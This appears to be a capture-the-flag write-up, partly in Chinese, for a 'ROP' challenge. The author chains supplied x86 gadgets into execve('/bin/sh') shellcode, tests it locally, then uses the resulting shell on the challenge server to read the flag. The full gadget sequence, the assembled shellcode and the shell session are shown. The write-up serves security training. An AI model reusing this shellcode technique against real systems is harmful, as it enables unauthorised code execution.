# ROP
現在有13個assembly 片斷code，你可以任意重複組合，目標是要開啟`/home/ctf/flag`。
 * Hint: [system call reference](http://syscalls.kernelgrok.com/)

```
$ nc 140.113.209.24 10001
0.	int 0x80
	pop ebp
	pop edi
	pop esi
	pop ebx
============================
1.	pop ebx
	pop ebp
	xor eax,eax
============================
2.	sub ecx,eax
	pop ebp
============================
3.	mov edx,eax
	pop ebx
============================
4.	pop ecx
	pop eax
============================
5.	mov (esp),edx
============================
6.	pop edx
	pop ecx
	pop edx
============================
7.	add ecx,eax
	pop ebx
============================
8.	add eax,0x2
============================
9.	push esp
	push ebp
============================
10.	push 0x68732f6e
	push 0x69622f2f
============================
11.	push 0x67616c66
	push 0x2f2f6674
	push 0x632f2f65
	push 0x6d6f682f
============================
12.	push 1
	push 2
============================
13.	push eax
============================
You can arrange what you like with the instructions.(e.g. 1,3,1,5,2)
Ref: http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html
```

## Analysis
最容易的方法是呼叫system call `execve`執行`/bin/sh`，所以我需要的stack & register 長相
 * registers
  1. `eax=0xb`
  2. `ebx=addr of "/bin/sh"`
  3. `ecx=esp`
  4. `edx=0x0`
 * stack: `execve("/bin/sh", NULL)`
  1. `push 0x0`
  2. `push addr of "/bin/sh"`
  3. call `execve`
 * 組合起來測試 [rop.asm](rop.asm)
```
$ nasm -f elf rop.asm && ld -m elf_i386 -s -o rop rop.o && ./rop
$
```

## Solve
```
$ nc 140.113.209.24 10001
...
Please assemble your assembly to get /home/ctf/flag:9,1,13,10,9,2,7,13,9,4,13,12,4,8,8,8,8,8,9,6,0
======Your code=====
global  _start
section .text
_start:
	push esp
	push ebp
	pop ebx
	pop ebp
	xor eax,eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	push esp
	push ebp
	sub ecx,eax
	pop ebp
	add ecx,eax
	pop ebx
	push eax
	push esp
	push ebp
	pop ecx
	pop eax
	push eax
	push 1
	push 2
	pop ecx
	pop eax
	add eax,0x2
	add eax,0x2
	add eax,0x2
	add eax,0x2
	add eax,0x2
	push esp
	push ebp
	pop edx
	pop ecx
	pop edx
	int 0x80
	pop ebp
	pop edi
	pop esi
	pop ebx
====================
Executing command:" nasm -f elf32 input.s && ./ld -m elf_i386 -o a.bin input.o && ./a.bin "
running ....
ls
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
cat home/ctf/flag
SECPROG{return_oriented_programming_is_easy!}
```
